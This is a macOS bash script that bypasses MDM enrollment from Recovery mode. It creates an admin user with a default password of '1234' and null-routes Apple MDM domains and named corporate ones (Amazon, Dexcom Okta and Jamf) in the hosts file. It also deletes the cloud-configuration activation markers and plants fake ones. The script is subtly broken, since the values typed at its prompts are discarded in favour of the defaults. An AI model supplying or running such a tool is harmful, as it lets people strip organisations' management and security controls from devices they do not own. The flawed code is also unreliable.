#!/bin/bash

# Define color codes
RED='\033[1;31m'
GRN='\033[1;32m'
BLU='\033[1;34m'
YEL='\033[1;33m'
PUR='\033[1;35m'
CYAN='\033[1;36m'
NC='\033[0m'

echo -e "${YEL}Bypass MDM from Recovery${NC}"

echo -e "${BLU}Fetching Data and Root Volume names${NC}"
data_volume=$(ls -1 /Volumes | grep ' - Data$') # Gets something like 'Macintosh HD - Data'
echo -e "${GRN}Data Volume: $data_volume${NC}"   
root_volume=${data_volume% - Data} # keeps only 'Macintosh HD'
echo -e "${GRN}Root Volume: $root_volume${NC}"   

echo -e "${BLU}Creating Temporary User${NC}"
read -p "Enter Temporary Fullname (Default is 'Apple'): " realName
real_name="${real_name:=Apple}"
read -p "Enter Temporary Username (Default is 'Apple'): " username
username="${username:=Apple}"
read -p "Enter Temporary Password (Default is '1234'): " passw
password="${password:=1234}"
# echo -e "${GRN}Password: $password${NC}" # if automated script

dscl_path="/Volumes/$data_volume/private/var/db/dslocal/nodes/Default"
users_path='/Local/Default/Users'
groups_path='/Local/Default/Groups'

dscl -f "$dscl_path" localhost -create "$users_path/$username"
dscl -f "$dscl_path" localhost -create "$users_path/$username" UserShell "/bin/zsh"
dscl -f "$dscl_path" localhost -create "$users_path/$username" RealName "$real_name"
dscl -f "$dscl_path" localhost -create "$users_path/$username" UniqueID "501"
dscl -f "$dscl_path" localhost -create "$users_path/$username" PrimaryGroupID "20"
mkdir -p "/Volumes/$data_volume/Users/$username"
dscl -f "$dscl_path" localhost -create "$users_path/$username" NFSHomeDirectory "/Users/$username"
dscl -f "$dscl_path" localhost -passwd "$users_path/$username" "$password"
dscl -f "$dscl_path" localhost -append "$groups_path/admin" GroupMembership "$username"

echo -e "${BLU}Blocking MDM domains${NC}"
mdm_domains=( 
  "deviceenrollment.apple.com"  "mdmenrollment.apple.com"  "iprofiles.apple.com"  "gdmf.apple.com"  "acmdm.apple.com"
  "albert.apple.com"  "mdm.apple.com"  "mdmenroll.apple.com"  "mdmcheckin.apple.com"  "school.apple.com"
  "mdm.amazon.com"  "deviceenrollment.amazon.com"  "dexcom.okta.com"  "dexcom.jamfcloud.com"
)
for domain in "${mdm_domains[@]}"; do
  echo "0.0.0.0 $domain" >> /Volumes/"$root_volume"/etc/hosts
done
echo -e "${GRN}Successfully blocked MDM & Profile Domains${NC}"

echo -e "${BLU}Removing configuration profiles${NC}"
profile_path="/Volumes/$root_volume/var/db/ConfigurationProfiles/Settings"

touch /Volumes/"$data_volume"/private/var/db/.AppleSetupDone
rm -rf $profile_path/.cloudConfigHasActivationRecord
rm -rf $profile_path/.cloudConfigRecordFound
touch $profile_path/.cloudConfigProfileInstalled
touch $profile_path/.cloudConfigRecordNotFound

echo -e "${GRN}MDM enrollment has been bypassed!${NC}"
echo -e "${NC}Rebooting your Mac...${NC}"

sleep 2
reboot
